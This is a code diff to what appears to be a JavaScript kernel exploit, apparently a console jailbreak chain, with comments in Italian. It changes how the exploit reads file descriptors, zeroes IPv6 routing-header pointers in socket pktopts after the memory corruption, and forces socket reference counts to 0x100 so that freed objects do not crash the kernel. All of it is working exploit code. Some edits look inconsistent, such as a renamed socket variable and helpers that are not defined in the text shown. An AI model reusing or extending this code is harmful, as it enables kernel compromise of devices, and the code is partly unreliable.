@@ -1179,7 +1179,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
 
     
-const kernel = kernel_addr;
+ 
 
     const kmrw  = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
 
@@ -1193,19 +1193,21 @@ const kernel = kernel_addr;
     
  
     
- function get_fd_data_addr(sock, read_fn) {
-      const fdesc = kernel_addr.curproc
-                  + BigInt(CURPROC_OFILES)
-                  + BigInt(sock) * BigInt(SIZEOF_OFILES);
-      const filep = read_fn(fdesc);
-      return read_fn(filep);
-    }
+function get_sock_pktopts(sock, read_fn) {
+  const sock_data = get_fd_data_addr(sock, read_fn);
+  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
+  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
+}
 
-    function get_sock_pktopts(sock, read_fn) {
-      const sock_data = get_fd_data_addr(sock, read_fn);
-      const pcb       = read_fn(sock_data + BigInt(SO_PCB));
-      return read_fn(pcb + BigInt(INPCB_PKTOPTS));
-    }
+    const ofiles = kread64(p_fd);
+
+
+function get_fd_data_addr(sock, read_fn) {
+
+  const filep = read_fn(ofiles + BigInt(sock) * 8n);
+ 
+  return read_fn(filep + 0n);
+}
 
 
     
@@ -1513,26 +1515,25 @@ const kernel = kernel_addr;
 
     
     for (let i = 0; i < sds.length; i++) {
-      const pkto = get_sock_pktopts(sds[i], read64);
-      write64(pkto + off_ip6po_rthdr, 0n);
-    }
-    // Azzera anche reclaim_sock e worker_pktopts
-    const re_pkto = get_sock_pktopts(reclaim_sock, read64);
-    write64(re_pkto + off_ip6po_rthdr, 0n);
-    write64(worker_pktopts + off_ip6po_rthdr, 0n);
+  const pkto = get_sock_pktopts(sds[i], read64);
+  write64(pkto + off_ip6po_rthdr, 0n);
+}
+// e per reclaim/worker
+write64(get_sock_pktopts(reclaim_sock, read64) + off_ip6po_rthdr, 0n);
+write64(worker_pktopts + off_ip6po_rthdr,             0n);
 
-    // 6) FIX: bump so_count per prevenire free involontarie
-    const sock_increase_ref = [
-      ipv6_kernel_rw.data.master_sock,
-      ipv6_kernel_rw.data.victim_sock,
-      master_sock,
-      worker_sock,
-      reclaim_sock,
-    ];
-    for (const sd of sock_increase_ref) {
-      const sock_addr = get_fd_data_addr(sd, read64);
-      write32(sock_addr + 0x0, 0x100);
-    }
+// Bump so_count per evitare free accidentali
+const sock_increase_ref = [
+  ipv6_kernel_rw.data.master_sock,
+  ipv6_kernel_rw.data.victim_sock,
+  main_sock,
+  worker_sock,
+  reclaim_sock
+];
+for (const sd of sock_increase_ref) {
+  const sock_addr = get_fd_data_addr(sd, read64);
+  write32(sock_addr + 0n, 0x100);
+}
     log("fixes applied");
 
     
